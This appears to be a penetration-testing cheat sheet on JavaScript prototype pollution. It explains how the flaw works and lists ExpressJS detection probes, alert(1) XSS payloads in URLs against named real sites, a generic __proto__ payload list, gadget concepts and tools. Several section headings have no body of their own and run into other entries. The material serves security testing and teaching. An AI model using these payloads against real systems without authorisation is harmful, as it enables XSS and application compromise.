entries.title: What it is
entries.body:
Prototype Pollution is a JavaScript vulnerability in which the properties of Object.prototype are changed. Objects in JS are dynamic: properties can be added at any moment. Almost all objects inherit from Object.prototype, so polluting the prototype affects ALL objects of the application - hence the attack vector.

If an attacker can add/change a property of Object.prototype, it affects every object that inherits from it, which leads to various classes of vulnerabilities (from logic bypasses to XSS and RCE).

entries.title: How we reach the prototype
The essence of the attack using the config example
Manual testing (ExpressJS, SSPP)
entries.body:
A set of safe probes for blackbox detection of server-side PP in ExpressJS. We pollute a property via __proto__ and observe a side effect in the response:

• { "__proto__":{"parameterLimit":1}} + 2 parameters in a GET request, at least 1 should be reflected in the response.
• { "__proto__":{"ignoreQueryPrefix":true}} + ??foo=bar
• { "__proto__":{"allowDots":true}} + ?foo.bar=baz
• Change the indentation of the JSON response: { "__proto__":{"json spaces":" "}} + {"foo":"bar"} - the server should return {"foo": "bar"}.
• Change the CORS headers: { "__proto__":{"exposedHeaders":["foo"]}} - the server should return the Access-Control-Expose-Headers header.
• Change the status code: { "__proto__":{"status":510}}

entries.title: Where to look for pollution
entries.body:
Access to the prototype of any object is through the magic property __proto__.
JSON.parse() parses a JSON string into an object and is often a sink function where prototype pollution happens.
Look for unsafe recursive merging/copying of objects (merge, extend, clone, defaultsDeep), parsing a query string into an object, and any code that places user-supplied keys into an object by path.

Client (CSPP) and server (SSPP) - the impact differs: CSPP usually leads to DOM XSS, SSPP - to RCE/DoS/logic bypass.

entries.title: Pollution via URL / hash
entries.body:
Examples of PP payloads encountered in real applications (the fragment after # is processed by client-side JS):

https://victim.com/#a=b&__proto__[admin]=1
https://example.com/#__proto__[xxx]=alert(1)
http://server/servicedesk/customer/user/signup?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E
https://www.apple.com/shop/buy-watch/apple-watch?__proto__[src]=image&__proto__[onerror]=alert(1)
https://www.apple.com/shop/buy-watch/apple-watch?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)

entries.title: Asynchronous payload for NodeJS (OOB via NODE_OPTIONS)
Impact of CSPP/SSPP
entries.body:
Depending on where the pollution executes - on the client (CSPP) or the server (SSPP) - the impact differs:

• Remote Command Execution - RCE in Kibana (CVE-2019-7609); RCE via EJS gadgets.
• Reflected XSS - Reflected XSS on www.hackerone.com via Wistia embed code (report #986386).
• Bypassing client-side sanitizers - Prototype pollution and bypassing client-side HTML sanitizers.
• Denial of Service - polluting Object.prototype breaks the logic and crashes the application.

entries.title: Collection of PP payloads (JS / query)
entries.body:
Object.__proto__["evilProperty"]="evilPayload"
Object.__proto__.evilProperty="evilPayload"
Object.constructor.prototype.evilProperty="evilPayload"
Object.constructor["prototype"]["evilProperty"]="evilPayload"
{"__proto__": {"evilProperty": "evilPayload"}}
{"__proto__.name":"test"}
x[__proto__][abaeead] = abaeead
x.__proto__.edcbcab = edcbcab
__proto__[eedffcb] = eedffcb
__proto__.baaebfc = baaebfc
?__proto__[test]=test

entries.title: What is a gadget in prototype pollution
entries.body:
A "gadget" is a piece of code, function, or application feature that can be exploited or used during an attack. In the context of prototype pollution, a "PP gadget" is a specific execution path / function / property that is vulnerable to prototype pollution or is exposed through it (for example, a property that is then substituted into a template, into spawning a process, or into configuration options).

Either build your own gadget from the application's sources using yeswehack/pp-finder, or use already-found gadgets from yuske/server-side-prototype-pollution (server-side) and BlackFan/client-side-prototype-pollution (client-side).

entries.title: Tools and resources
entries.body:
• yeswehack/pp-finder - finding gadgets for exploiting prototype pollution.
• yuske/silent-spring - prototype pollution -> RCE in Node.js.
• yuske/server-side-prototype-pollution - server-side PP gadgets in the Node.js core and third-party NPM packages.
• BlackFan/client-side-prototype-pollution - client-side PP and useful script gadgets.
• portswigger/server-side-prototype-pollution - a Burp Suite extension for detecting server-side PP.
• msrkp/PPScan - a client-side prototype pollution scanner.

Labs: YesWeHack Dojo - Prototype Pollution; PortSwigger Web Security Academy - Prototype Pollution.
